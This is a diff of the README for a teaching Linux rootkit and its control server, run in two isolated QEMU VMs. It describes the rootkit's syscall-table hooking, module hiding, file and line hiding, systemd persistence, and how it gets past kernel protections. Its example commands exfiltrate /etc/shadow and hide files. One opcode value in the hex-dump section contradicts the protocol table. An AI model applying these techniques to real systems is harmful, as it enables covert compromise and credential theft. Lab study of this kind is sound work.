@@ -1,526 +1,338 @@
 # WLKOM — Wild Linux Kernel Object Module
 
-## What is this?
+Pedagogical Linux rootkit split into two components:
 
-WLKOM is a pedagogical Linux rootkit split into two components:
-
-- **Attacking program** (`attacking_program/`): a C2 (Command & Control) server running on the attacker VM. It listens for the rootkit to connect, authenticates it, then lets you send commands.
-- **Rootkit** (`rootkit/`): a Linux kernel module (LKM) loaded on the victim VM. Once loaded, it contacts the C2 server and executes commands received from it.
+- **Control server** (`attacking_program/`): runs on the attacker VM, listens for the rootkit to connect, authenticates it, and exposes an interactive command shell.
+- **Rootkit** (`rootkit/`): a Linux kernel module loaded on the victim VM. It contacts the control server, authenticates, and executes commands received from it.
 
 ---
 
-## Architecture
+## Network overview
 
 ```
-Host (Arch Linux)
-├── Attacker VM  ──── ens3 (NAT, SSH :2222) ────────────────────────────────┐
-│                ──── ens4 (socket net, 192.168.100.10) ─────────────────┐  │
-│                                                                         │  │
-└── Victim VM    ──── ens3 (NAT, SSH :2223) ────────────────────────────┐│  │
-                 ──── ens4 (socket net, 192.168.100.20) ────────────────┘│  │
-                                                                          │  │
-Host machine ─── port 2222 → Attacker SSH ───────────────────────────────┘  │
-             ─── port 2223 → Victim SSH ─────────────────────────────────────┘
+Host machine
+├── Attacker VM  — ens3 (NAT, SSH :2222)
+│                — ens4 (192.168.100.10, private)
+└── Victim VM    — ens3 (NAT, SSH :2223)
+                 — ens4 (192.168.100.20, private)
 
-Rootkit (victim) → TCP 192.168.100.10:4444 → C2 server (attacker)
+Rootkit (victim) ──TCP 192.168.100.10:4444──► Control server (attacker)
 ```
 
-The two VMs communicate over a QEMU socket-based virtual network (no external network required). The attacker VM opens a socket that the victim VM connects to. This creates an isolated point-to-point link between the two VMs, simulating a real network without Internet exposure.
+The two VMs share a QEMU socket-based virtual network — no Internet required.
 
-### Network protocol
-
-Each packet on the C2 channel:
+### Protocol
 
 ```
 [1 byte  : opcode]
-[4 bytes : payload length (big-endian)]
-[N bytes : payload (XOR encrypted with a 32-byte key)]
+[4 bytes : payload length, big-endian]
+[N bytes : XOR-encrypted payload (32-byte key)]
 ```
 
-| Opcode | Value | Direction       | Description                  |
-|--------|-------|-----------------|------------------------------|
-| AUTH   | 0x01  | both            | Authentication handshake     |
-| EXEC   | 0x02  | C2→rootkit      | Execute a shell command      |
-| UPLOAD | 0x03  | C2→rootkit      | Send a file to the victim    |
-| DOWNLOAD | 0x04 | C2→rootkit    | Retrieve a file from victim  |
-| HIDE_FILE | 0x05 | C2→rootkit  | Hide a file/dir from `ls`    |
-| UNHIDE_FILE | 0x06 | C2→rootkit| Unhide a file/dir            |
-| HIDE_LINE | 0x07 | C2→rootkit  | Hide lines in a file         |
-| UNHIDE_LINE | 0x08 | C2→rootkit| Unhide lines in a file       |
-| PING   | 0x09  | both            | Connectivity check           |
-| PONG   | 0x0A  | rootkit→C2      | Ping response                |
-
----
-
-## Why Debian? Why kernel 6.1?
-
-### Distribution choice: Debian 12 (Bookworm)
-
-Debian is used for both VMs because:
-
-- Its packaging system installs `linux-headers` that exactly match the running kernel, which is required to build an out-of-tree kernel module.
-- Its default kernel configuration does **not** enforce module signature verification (`CONFIG_MODULE_SIG_FORCE=n`), so an unsigned `.ko` can be loaded with `insmod`.
-- It ships a **stable LTS kernel (6.1.x)**, which means the kernel ABI changes slowly enough for the rootkit to compile and run reliably.
-- The preseed automation system (`d-i`) allows fully unattended installation, which is useful for this project's automated setup.
-
-### Kernel version: 6.1 LTS
-
-**Why not the most recent kernel (6.8+)?**
-
-Several changes in recent kernels break parts of this rootkit:
-
-1. **`kobject_del` for module hiding (kernel ≥ 6.4)**
-   The code in `hide.c` calls `kobject_del(&THIS_MODULE->mkobj.kobj)` to remove the module from `/sys/module/`. Since kernel 6.4, the module `mkobj` lifetime and reference counting changed: calling `kobject_del` on it can trigger a kernel panic or a use-after-free. The code guards this with `#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)`. On Debian 12 (kernel 6.1), the call works correctly.
-
-2. **`kallsyms_lookup_name` via kprobe (kernel ≥ 5.7)**
-   Since kernel 5.7, `kallsyms_lookup_name` is no longer exported to modules. The rootkit uses a kprobe to locate it at runtime. This works on 6.1. On very recent kernels with stricter kprobe restrictions or lockdown mode enabled (e.g., when Secure Boot is active), the kprobe can fail.
-
-3. **Kernel Lockdown LSM (kernel ≥ 5.4, enforced when Secure Boot is on)**
-   When `CONFIG_SECURITY_LOCKDOWN_LSM=y` and Secure Boot is active, the kernel refuses to load unsigned modules. Debian 12 supports Secure Boot but does **not** enforce module signature for third-party modules by default if Secure Boot is not active. If you are running the VM without UEFI Secure Boot (which is the case in our QEMU setup), this is not an issue.
-
-4. **Syscall table write protection**
-   The rootkit disables write protection via `write_cr0()`. This technique works on kernel 6.1. On newer kernels compiled with `CONFIG_X86_KERNEL_IBT` (Indirect Branch Tracking, enabled in some 6.x configs), writing to the syscall table may trigger additional protections. Debian 12's default kernel does not enable IBT.
-
-**Summary:** Debian 12 (kernel 6.1 LTS) is the most recent kernel that satisfies all of:
-- No enforced module signing
-- `kobject_del` works for module hiding
-- No IBT protection on syscall table
-- kprobe-based `kallsyms_lookup_name` lookup works
-
----
-
-## VM Setup — Why cloud-init instead of a traditional installer?
-
-> On dit merci qui ? Merci Claude. 🤝
->
-> The original setup used a Debian netinstall ISO with a preseed file — Debian's classic
-> automated installation system. After a review, the whole approach was replaced with
-> Debian cloud images + cloud-init. Here's why.
-
-### Before vs. After
-
-| | Before (preseed + netinstall) | After (cloud image + cloud-init) |
+| Opcode | Value | Description |
 |---|---|---|
-| **Base image** | ~400 MB netinstall ISO | ~300 MB pre-built cloud image |
-| **Install step** | Yes — full Debian installer run | No — image is already installed |
-| **Time to ready** | 10–20 min per VM | ~2 min per VM (first boot only) |
-| **Config format** | Debian-specific preseed syntax | Standard YAML (`#cloud-config`) |
-| **Extra tools needed** | `xorriso` (ISO rebuilding) | `genisoimage` (tiny seed ISO) |
-| **Custom ISO to build** | Yes — xorriso rebuild for each VM | No — just a 3-file seed ISO |
-| **Readable config** | Hard (preseed is verbose and cryptic) | Easy (YAML, self-documented) |
-
-### How cloud-init works
-
-Instead of running the Debian installer, we start from an image that Debian
-publishes officially and that is already fully installed: `debian-12-genericcloud-amd64.qcow2`.
-
-Each VM gets a **seed ISO** — a small virtual CD with three files:
-
-```
-seed_attacker.iso  (label: cidata)
-├── user-data       ← YAML: user, password, packages, SSH config
-├── meta-data       ← hostname and instance-id
-└── network-config  ← static IP on the private interface (ens4)
-```
-
-On first boot, cloud-init detects the `cidata` drive, reads these files, and
-configures the system: creates the user, installs packages, sets the IP.
-On every subsequent boot, cloud-init sees it already ran and does nothing.
-
-The seed ISO is generated by `setup_attacker.sh` / `setup_victim.sh` from
-templates in `scripts/cloud-init/`, with placeholders substituted from `.env`.
-
-### Disk: copy-on-write backing
-
-Both VMs share the same downloaded base image as a **read-only backing file**:
-
-```bash
-qemu-img create -f qcow2 -b debian-12-cloud-base.qcow2 -F qcow2 attacker.qcow2 8G
-```
-
-`attacker.qcow2` only stores the differences from the base. The base is never
-modified. This saves ~600 MB of disk space compared to two independent full copies.
+| `AUTH` | 0x01 | Authentication handshake |
+| `EXEC` | 0x02 | Execute a shell command on the victim |
+| `UPLOAD` | 0x03 | Send a file to the victim |
+| `DOWNLOAD` | 0x04 | Retrieve a file from the victim |
+| `HIDE_FILE` | 0x05 | Hide a file/dir from `ls` |
+| `UNHIDE_FILE` | 0x06 | Unhide a file/dir |
+| `HIDE_LINE` | 0x07 | Filter lines containing a pattern in a file |
+| `UNHIDE_LINE` | 0x08 | Remove a line filter |
+| `PING` | 0x09 | Connectivity check |
+| `PONG` | 0x0A | Ping response |
 
 ---
 
-## Prerequisites (host: Arch Linux)
+## Prerequisites
 
-The `setup_vms.sh` script handles dependency installation. You need:
-
-- A CPU with Intel VT-x (`vmx`) or AMD-V (`svm`) — check with `grep -E 'vmx|svm' /proc/cpuinfo`
-- An Internet connection (~300 MB for the Debian cloud image)
-- ~5 GB of free disk space (2 × 8G qcow2, sparse on disk)
-- A working display (QEMU opens GTK windows for the VMs)
-
-**Do not run the script as root.**
+- CPU with Intel VT-x or AMD-V: `grep -E 'vmx|svm' /proc/cpuinfo`
+- QEMU/KVM, `genisoimage`, `wget` — installed automatically by `init.sh`
+- ~5 GB free disk (two 8G qcow2 images, sparse)
+- Internet connection for the first run (~300 MB Debian cloud image download)
 
 ---
 
 ## Quick start
 
 ```bash
-# 1. Clone or unzip the project
+# 1. Clone the project
 cd wlkom-lapsus/
 
-# 2. (Optional) Edit .env to customize IPs, ports, credentials
-#    Defaults work out of the box.
-cat .env
+# 2. (Optional) edit .env to change IPs, ports, or credentials
+cat scripts/.env
 
-# 3. Run setup — installs deps, downloads cloud image, creates disks + seed ISOs
-./setup_vms.sh
+# 3. First-time setup — run as your normal user (not root)
+bash init.sh
 
-# 4. Start both VMs (attacker FIRST — it opens the socket)
-./vms/start_attacker.sh   # Terminal 1
-./vms/start_victim.sh     # Terminal 2
-# Cloud-init configures each VM on first boot (~2 min). No install step needed.
+# 4. Start the attacker VM FIRST (it opens the socket the victim connects to)
+bash vms/start_attacker.sh   # Terminal 1
 
-# 5. Deploy everything (compiles + loads rootkit)
-./vms/deploy.sh
+# 5. Start the victim VM
+bash vms/start_victim.sh     # Terminal 2
+# Cloud-init configures each VM on first boot (~2 min). Subsequent boots are instant.
 
-# 6. Connect to the attacker VM and run the C2 server
-ssh wlkom@localhost -p 2222
-cd ~/attacking_program && ./wlkom_c2 4444
+# 6. Deploy: compile + transfer + load the rootkit
+bash vms/deploy.sh
+
+# 7. Launch the control server on the attacker VM
+ssh -i vms/wlkom_key wlkom@localhost -p 2222
+cd ~/attacking_program && ./wlkom_control 4444
+# Password: wlk0m_s3cr3t
 ```
 
 ---
 
-## Step-by-step guide
+## Configuration — `scripts/.env`
 
-### Step 1 — Understand `.env`
-
-All configuration lives in `.env` at the project root. Every script sources it automatically.
+All parameters live in `scripts/.env`. Every script sources it.
 
 ```bash
-ATTACKER_IP=192.168.100.10   # IP of attacker VM on private network
-VICTIM_IP=192.168.100.20     # IP of victim VM on private network
-NET_IFACE_PRIVATE=ens4       # Private network interface name inside the VMs
-DISK_SIZE=8G                 # Size of each VM disk
-RAM=2048                     # RAM per VM (MB)
-CPUS=2                       # vCPUs per VM
-VM_USER=wlkom                # Username inside VMs
-VM_PASS=wlkom1234            # Password inside VMs
-CONTROL_PORT=4444            # Port the C2 server listens on
-ATTACKER_SSH_PORT=2222       # Host port forwarded to attacker SSH
-VICTIM_SSH_PORT=2223         # Host port forwarded to victim SSH
-SOCKET_PORT=12345            # Host port for the VM-to-VM socket link
-DEBIAN_CLOUD_URL=https://... # Debian 12 genericcloud image URL
+ATTACKER_IP=192.168.100.10    # Attacker VM IP on the private network
+VICTIM_IP=192.168.100.20      # Victim VM IP on the private network
+CONTROL_PORT=4444             # Port the control server listens on
+VM_USER=wlkom                 # Username inside both VMs
+VM_PASS=wlkom1234             # VM login password
+ATTACKER_SSH_PORT=2222        # Host port → attacker SSH
+VICTIM_SSH_PORT=2223          # Host port → victim SSH
+DISK_SIZE=8G                  # Disk size per VM
+RAM=2048                      # RAM per VM (MB)
+CPUS=2                        # vCPUs per VM
 ```
 
-Edit this file before running `setup_vms.sh` if you want different values.
-Do not commit it to version control if you change credentials.
+---
 
-### Step 2 — Run `setup_vms.sh`
+## Step-by-step
+
+### Step 1 — `bash init.sh`
+
+Run once on the host. It:
+
+1. Checks that KVM is available (`/dev/kvm`)
+2. Installs QEMU, `genisoimage`, `wget` if missing
+3. Generates an ED25519 SSH key pair at `vms/wlkom_key` + `vms/wlkom_key.pub`
+4. Downloads the Debian 12 genericcloud base image (~300 MB, shared by both VMs)
+5. Creates `attacker.qcow2` and `victim.qcow2` as copy-on-write overlays
+6. Builds seed ISOs from the templates in `scripts/cloud-init/`, substituting
+   values from `.env` and the SSH public key
+
+After this step, `vms/` contains everything needed to start the VMs.
+
+### Step 2 — Start the VMs
+
+**Always start the attacker first** — it opens a QEMU socket that the victim
+connects to. Starting the victim first causes it to fail with "connection refused".
 
 ```bash
-./setup_vms.sh
+bash vms/start_attacker.sh   # Terminal 1 — wait for the QEMU window to appear
+bash vms/start_victim.sh     # Terminal 2
 ```
 
-This script:
-1. Checks KVM support on the CPU
-2. Installs QEMU, `genisoimage`, and `wget` (via `pacman` or `apt`)
-3. Adds your user to the `kvm` group (re-login required if just added)
-4. Downloads the Debian 12 cloud base image (~300 MB)
-5. Calls `setup_attacker.sh` — creates `attacker.qcow2` + `seed_attacker.iso`
-6. Calls `setup_victim.sh` — creates `victim.qcow2` + `seed_victim.iso`
-7. Copies launch scripts from `scripts/` to `vms/`
+On **first boot**, cloud-init configures each VM (~2 min): creates the user, sets
+the password, installs packages, configures `ens4` with a static IP. On
+subsequent boots this is skipped.
 
-After this step, `vms/` contains:
-
-```
-vms/
-├── debian-12-cloud-base.qcow2   (shared read-only base, never modified)
-├── attacker.qcow2               (copy-on-write, backed by base)
-├── victim.qcow2                 (copy-on-write, backed by base)
-├── seed_attacker.iso            (cloud-init seed — configures attacker on first boot)
-├── seed_victim.iso              (cloud-init seed — configures victim on first boot)
-├── start_attacker.sh
-├── start_victim.sh
-└── deploy.sh
-```
-
-### Step 3 — Start the VMs
-
-**Important:** start the Attacker VM first — it opens the socket that the Victim connects to.
+SSH access from the host:
 
 ```bash
-# Terminal 1 — open first
-./vms/start_attacker.sh
-
-# Terminal 2 — open after attacker window appears
-./vms/start_victim.sh
+ssh -i vms/wlkom_key wlkom@localhost -p 2222   # Attacker
+ssh -i vms/wlkom_key wlkom@localhost -p 2223   # Victim
 ```
 
-On **first boot**, cloud-init runs and configures the VM (~2 min): creates the
-user, sets the password, installs packages, configures the static IP on `ens4`.
-On subsequent boots, this is skipped instantly.
+### Step 3 — `bash vms/deploy.sh`
 
-Each VM has two network interfaces:
-- `ens3`: NAT — Internet access + SSH port-forward to host
-- `ens4`: private socket network — static IP, used for rootkit ↔ C2 traffic
-
-SSH access from the host (once cloud-init has finished):
+With both VMs running and SSH reachable:
 
 ```bash
-ssh wlkom@localhost -p 2222   # Attacker VM
-ssh wlkom@localhost -p 2223   # Victim VM
+bash vms/deploy.sh
 ```
 
-### Step 4 — Deploy
+It:
 
-Once both VMs are up and SSH is reachable:
-
-```bash
-./vms/deploy.sh
-```
-
-This script:
 1. Waits for SSH to be reachable on both VMs
-2. Copies `attacking_program/` to the attacker VM and compiles it
-3. Copies `rootkit/` to the victim VM, compiles the kernel module
-4. Loads the module: `sudo insmod wlkom.ko c2_ip=192.168.100.10 c2_port=4444`
-5. Installs persistence via a systemd service that reloads the module at boot
-6. Removes build artifacts from the victim VM
+2. Copies and compiles `attacking_program/` on the attacker VM
+3. Copies and compiles `rootkit/` on the victim VM
+4. Loads the module: `sudo insmod wlkom.ko control_ip=... control_port=...`
+5. The rootkit installs its own persistence on load (systemd service)
 
-### Step 5 — Use the C2
+### Step 4 — Use the control server
 
-SSH into the attacker VM and launch the C2 server:
+On the attacker VM:
 
 ```bash
-ssh wlkom@localhost -p 2222
-cd ~/attacking_program
-./wlkom_c2 4444
+./wlkom_control 4444
+# Password: wlk0m_s3cr3t
 ```
 
-You will be prompted for a password:
+The rootkit retries the connection every 5 seconds. Within a few seconds:
 
 ```
-Password: wlk0m_s3cr3t
-```
-
-The server starts listening. Within a few seconds (the rootkit retries every 5 seconds):
-
-```
-[2026-01-01 12:00:00] WLKOM C2 listening on port 4444
-[2026-01-01 12:00:05] New connection from 192.168.100.20:xxxxx
-[2026-01-01 12:00:05] Rootkit authenticated from 192.168.100.20:xxxxx
+[2026-01-01 12:00:00] WLKOM control listening on port 4444
+[2026-01-01 12:00:05] New connection from 192.168.100.20:49200
+[2026-01-01 12:00:05] Rootkit authenticated from 192.168.100.20:49200
 ```
 
 ---
 
-## C2 command reference
+## Command reference
 
-```
-WLKOM C2 > help
-```
-
-| Command                       | Description                                   |
-|-------------------------------|-----------------------------------------------|
-| `ping`                        | Check if the rootkit is alive (PONG)          |
-| `exec <cmd>`                  | Run a shell command on the victim             |
-| `upload <local> <remote>`     | Send a file from your machine to the victim   |
-| `download <remote> <local>`   | Retrieve a file from the victim               |
-| `hide_file <name>`            | Hide a file or directory from `ls`/`readdir`  |
-| `unhide_file <name>`          | Make a hidden file visible again              |
-| `hide_line <file> <pattern>`  | Hide lines containing `pattern` in `file`     |
-| `unhide_line <file> <pattern>`| Restore hidden lines                          |
-| `exit`                        | Disconnect                                    |
+| Command | Description |
+|---|---|
+| `ping` | Check if the rootkit is alive |
+| `exec <cmd>` | Run a shell command on the victim |
+| `upload <local> <remote>` | Send a file from attacker to victim |
+| `download <remote> <local>` | Retrieve a file from victim |
+| `hide_file <name>` | Hide a file/dir from `ls` and `readdir` |
+| `unhide_file <name>` | Restore a hidden file |
+| `hide_line <file> <pattern>` | Filter lines matching pattern in a file |
+| `unhide_line <file> <pattern>` | Remove a line filter |
+| `exit` | Disconnect |
 
 ### Examples
 
 ```
-WLKOM C2 > exec whoami
+WLKOM > exec whoami
 root
 
-WLKOM C2 > exec uname -r
-6.1.0-28-amd64
-
-WLKOM C2 > upload /tmp/payload.sh /tmp/payload.sh
+WLKOM > upload /tmp/tool /tmp/tool
 Upload: OK
 
-WLKOM C2 > download /etc/shadow ./shadow.txt
-Downloaded 1234 bytes → ./shadow.txt
+WLKOM > download /etc/shadow ./shadow.txt
+Downloaded 1842 bytes -> ./shadow.txt
 
-WLKOM C2 > hide_file wlkom.ko
-Hide file request sent: wlkom.ko
+WLKOM > hide_file wlkom.ko
+hide_file request sent: wlkom.ko
 
-WLKOM C2 > hide_line /etc/modules wlkom
-hide_line request sent
-
-WLKOM C2 > ping
+WLKOM > ping
 PONG
 ```
 
 ---
 
-## Rootkit features
+## VM setup — design decisions
 
-### Connection and reconnection
+### Why Debian 12 + cloud images?
 
-The rootkit starts a kernel thread (`wlkom_c2`) on module load. The thread:
-1. Attempts to connect to the C2 IP and port
-2. If the connection fails, sleeps 5 seconds and retries indefinitely
-3. On connection, sends a PING so the C2 gets an immediate visual alert
-4. Runs an authentication handshake
-5. Enters a packet receive loop
+Debian's kernel does not enforce module signature verification without Secure Boot,
+so unsigned `.ko` files load without signing infrastructure. Kernel 6.1 LTS is the
+most recent version where all rootkit techniques work reliably (see
+`rootkit/README.md` for details).
 
-If the C2 disconnects, the thread reconnects automatically.
+Cloud images replace a traditional netinstall: no installer, no preseed file,
+~2 min to a ready VM instead of 15–20 min.
 
-### Authentication
+### SSH key injection
 
-The C2 sends the real password to the rootkit over the encrypted channel. The rootkit compares it and replies `OK` or `FAIL`. The password is not hardcoded in the rootkit binary — it is sent by the C2 at connection time.
+`init.sh` generates `vms/wlkom_key` once. The public key is injected into each
+VM's `user-data` via a `__SSH_PUBKEY__` placeholder. Cloud-init writes it to
+`~/.ssh/authorized_keys` on first boot. `deploy.sh` uses `-i vms/wlkom_key` for
+all SSH/SCP calls — no password prompts, no `sshpass`.
 
-On the C2 side, the password is stored Caesar-shifted in the binary (`WLKOM_PASSWORD` in `server.h`) and decrypted at runtime before being sent. This prevents trivial `strings` extraction.
+### Copy-on-write disks
 
-### Command execution
+Both VMs share the downloaded base image as a read-only backing file. Each overlay
+only stores differences, saving ~300 MB compared to two independent copies.
 
-Shell commands are executed via `call_usermodehelper("/bin/sh", ["-c", cmd])`. Output is captured by redirecting stdout/stderr to a temp file (`/tmp/.wlkom_out`), reading it, and deleting it.
+### AZERTY keyboard
 
-### File hiding (getdents64 hook)
-
-The rootkit hooks `getdents64` (and `getdents` for 32-bit compat) in the syscall table. When a directory listing is requested, any entry whose name matches a name in the hidden-files list is removed from the result before returning to userspace. This makes `ls`, `find`, and similar tools blind to those files.
-
-### Line hiding (read hook)
-
-The rootkit hooks `read`. When a process reads a file, the kernel buffer is scanned for lines containing any registered pattern. Matching lines are removed in-place before the data reaches userspace. This is used to hide the rootkit's entries in `/etc/modules`, systemd service files, etc.
-
-### Module hiding
-
-On load, the rootkit calls `list_del_init(&THIS_MODULE->list)` to remove itself from the kernel's internal module list (shown by `lsmod` and `/proc/modules`). On kernel < 6.4, it also calls `kobject_del` to remove itself from `/sys/module/`.
-
-### Persistence
-
-The rootkit installs itself via a systemd service:
-
-```
-/etc/systemd/system/wlkom.service
-/lib/modules/<kernel>/kernel/wlkom/wlkom.ko
-```
-
-Both paths are added to the file-hiding list so `ls` will not show them.
-
-### Encryption
-
-All payload data on the network is XOR-encrypted with a 32-byte key (`wlk0m_xor_k3y_32bytes_padding__`). Both the C2 server (`server.c`) and the rootkit (`connect.c`) use the same key. This prevents a passive observer (e.g., `tcpdump`) from reading commands and outputs in cleartext.
+Configured via `keyboard: layout: fr` (cloud-init module) and
+`localectl set-keymap fr` in `runcmd`. Both are needed because the two mechanisms
+can race on first boot.
 
 ---
 
-## Makefile targets
+## Project structure
 
-### `attacking_program/`
-
-```bash
-make          # Build wlkom_c2
-make check    # Run tests (requires libcriterion)
-make clean    # Remove build artifacts
 ```
-
-### `rootkit/`
-
-```bash
-make          # Build wlkom.ko
-make load     # insmod wlkom.ko with default IP/port
-make unload   # rmmod wlkom
-make clean    # Remove build artifacts
-```
-
-Override C2 address at build time:
-
-```bash
-make load C2_IP=192.168.100.10 C2_PORT=4444
+wlkom-lapsus/
+├── init.sh                  — first-time setup (run once on host)
+├── README.md
+├── AUTHORS
+├── attacking_program/
+│   ├── README.md            — technical choices and design
+│   ├── Makefile
+│   ├── include/             — crypto.h, protocol.h, network.h, commands.h
+│   └── src/                 — main.c, crypto.c, protocol.c, network.c, commands.c
+├── rootkit/
+│   ├── README.md            — technical choices and design
+│   ├── Makefile
+│   ├── assets/wlkom.service
+│   ├── include/             — crypto.h, protocol.h, commands.h, network.h, hide.h, persist.h
+│   └── src/                 — main.c, crypto.c, protocol.c, commands.c, network.c, hide.c, persist.c
+└── scripts/
+    ├── .env                 — all configuration
+    ├── utils.sh
+    ├── setup_vm.sh
+    ├── deploy.sh
+    └── cloud-init/
+        ├── attacker/        — user-data, meta-data, network-config
+        └── victim/          — user-data, meta-data, network-config
 ```
 
 ---
 
-## Security considerations disabled (and why)
+## Verifying network encryption
 
-| Security feature         | Status in this setup | Technical reason |
-|--------------------------|----------------------|------------------|
-| Module signature (MODSIG) | Disabled (Debian default) | Debian does not enforce `CONFIG_MODULE_SIG_FORCE` without Secure Boot. Enabling it would require signing `wlkom.ko` with a key enrolled in MOK, which is outside the scope of this project. |
-| Secure Boot              | Disabled (QEMU default) | QEMU's `-machine type=pc` does not use UEFI by default. Secure Boot requires OVMF firmware (`-bios /usr/share/ovmf/x64/OVMF.fd`). With Secure Boot, unsigned modules are rejected. |
-| Kernel lockdown LSM      | Not active (no Secure Boot) | Lockdown mode is automatically enabled when Secure Boot is active on Debian. Without Secure Boot it is not enforced. |
-| KASLR                    | Active (no mitigation) | KASLR randomizes kernel text address but not symbol addresses in `/proc/kallsyms`. The rootkit finds `sys_call_table` via `kallsyms_lookup_name`, which bypasses KASLR. |
+Both VMs have Wireshark and tshark pre-installed. The `wlkom` user is added to
+the `wireshark` group, so no `sudo` is needed.
+
+### Capture on the private interface
+
+```bash
+# On either VM — capture traffic on the private network interface
+tshark -i ens4
+```
+
+### What you should see
+
+When the rootkit connects and the operator runs commands, tshark will show TCP
+segments between `192.168.100.10` and `192.168.100.20`. The payload bytes will
+be unreadable noise — XOR-encrypted with the 32-byte key. No command text, no
+output, no password will appear in cleartext.
+
+Example with `-x` (hex + ASCII dump):
+
+```
+0000  00 01 00 00 00 0c 61 1d 55 1b 4b 17 55 0e 1b 0a   ......a.U.K.U...
+0010  0a 1d 55 0a                                        ..U.
+```
+
+The first byte is the opcode (`0x00` = CMD_EXEC), the next 4 bytes are the
+length in big-endian, and the rest is the XOR-encrypted payload. There is no
+way to read the actual command without the key.
+
+### Wireshark GUI
+
+If you have X forwarding enabled (`ssh -X`):
+
+```bash
+wireshark &
+```
+
+Select `ens4` as the capture interface. You can confirm that TCP payloads
+contain no plaintext strings by running `strings` on a captured `.pcap` file —
+only the fixed 5-byte header (1 opcode + 4 length) will be consistent.
 
 ---
 
 ## Troubleshooting
 
-**KVM not available**
-```
-grep -E 'vmx|svm' /proc/cpuinfo
-```
-If empty, check BIOS/UEFI for "Intel Virtualization Technology" or "AMD-V" setting.
+**KVM not available** — check BIOS/UEFI for "Intel Virtualization Technology" or "AMD-V".
 
-**`kvm` group not effective after setup**
-Log out and back in (or run `newgrp kvm`) after `setup_vms.sh` adds your user to the `kvm` group.
+**`kvm` group not active** — log out and back in after `init.sh` adds you to the group.
 
-**Victim VM fails to start (socket refused)**
-The victim connects to a socket opened by the attacker. Always start the attacker VM first.
+**Victim VM fails to start** — always start the attacker first (it opens the socket).
 
-**Rootkit does not appear in C2 after loading**
-Check dmesg on the victim:
-```bash
-sudo dmesg | grep WLKOM
-```
-Common causes: wrong C2 IP, C2 server not started yet (the rootkit retries every 5 seconds).
+**Rootkit does not appear in the control server** — check `sudo dmesg | grep WLKOM` on the victim.
+The rootkit retries every 5 seconds automatically; make sure the control server is
+running and the IP/port match `.env`.
 
-**`make` fails on victim (missing kernel headers)**
+**Missing kernel headers on victim**:
 ```bash
 sudo apt-get install -y linux-headers-$(uname -r)
 ```
 
-**Module already loaded**
+**Module already loaded**:
 ```bash
 sudo rmmod wlkom
-```
-
----
-
-## File structure
-
-```
-wlkom-lapsus/
-├── .env                     # Configuration (IPs, ports, credentials)
-├── .gitignore
-├── AUTHORS
-├── README.md
-├── setup_vms.sh             # Main setup script (run once on host)
-├── attacking_program/
-│   ├── Makefile
-│   ├── include/
-│   │   ├── server.h         # Packet protocol, opcodes, client struct
-│   │   └── commands.h       # commands_loop declaration
-│   ├── src/
-│   │   ├── main.c           # Entry point, password prompt
-│   │   ├── server.c         # TCP server, packet I/O, crypto, auth
-│   │   └── commands.c       # Command dispatch (exec, upload, hide...)
-│   └── tests/
-│       ├── test_server.c
-│       └── test_commands.c
-├── rootkit/
-│   ├── Makefile
-│   ├── include/
-│   │   ├── connect.h        # connect_init/exit, opcodes, password
-│   │   ├── hide.h           # hide_init/exit, hide_file/line...
-│   │   └── persist.h        # persist_init/exit
-│   └── src/
-│       ├── main.c           # Module init/exit, module params
-│       ├── connect.c        # Kernel TCP client, packet loop, commands
-│       ├── hide.c           # Syscall table hooks, getdents64, read
-│       └── persist.c        # Systemd service install
-├── setup_attacker.sh        # Creates attacker disk + seed ISO
-├── setup_victim.sh          # Creates victim disk + seed ISO
-└── scripts/
-    ├── lib.sh               # Shared functions (logs, SSH helpers)
-    ├── cloud-init/
-    │   ├── attacker/
-    │   │   ├── user-data        # YAML: user, packages, SSH
-    │   │   ├── meta-data        # hostname + instance-id
-    │   │   └── network-config   # static IP on ens4
-    │   └── victim/
-    │       ├── user-data
-    │       ├── meta-data
-    │       └── network-config
-    ├── start_attacker.sh    # Launch attacker VM (attacker first — opens socket)
-    ├── start_victim.sh      # Launch victim VM
-    └── deploy.sh            # Compile + deploy + load rootkit
 ```
